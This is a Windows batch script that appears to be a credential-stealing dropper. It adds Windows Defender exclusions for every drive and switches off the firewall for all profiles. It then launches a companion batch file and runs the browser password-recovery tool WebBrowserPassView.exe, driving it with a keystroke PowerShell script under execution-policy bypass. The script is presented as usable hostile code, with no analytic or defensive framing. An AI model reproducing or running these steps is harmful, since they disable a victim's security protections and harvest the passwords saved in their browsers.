@echo off
setlocal enabledelayedexpansion

for %%d in (A B C D E F G H I J K L M N O P Q R S T U V W X Y Z) do (
    if exist %%d:\ (
        powershell -Command "Add-MpPreference -ExclusionPath '%%d:\'"
        echo Exclusion added for %%d:\
    ) else (
        echo Drive %%d does not exist.
    )
)

netsh advfirewall set allprofiles state off

rem Launch launch.bat as administrator

rem Launch the batch file
start "" "%~dp0launch.bat"

rem Wait for WebBrowserPassView.exe to start
timeout /t 0.1 /nobreak

rem Start WebBrowserPassView.exe
start "" "%~dp0WebBrowserPassView.exe"

rem Wait for WebBrowserPassView.exe to fully initialize (adjust the timeout as needed)
timeout /t 0.1 /nobreak

rem Run the PowerShell script within the interface of WebBrowserPassView.exe
powershell.exe -ExecutionPolicy Bypass -File "%~dp0keystroke.ps1"

rem Close WebBrowserPassView.exe
taskkill /f /im WebBrowserPassView.exe

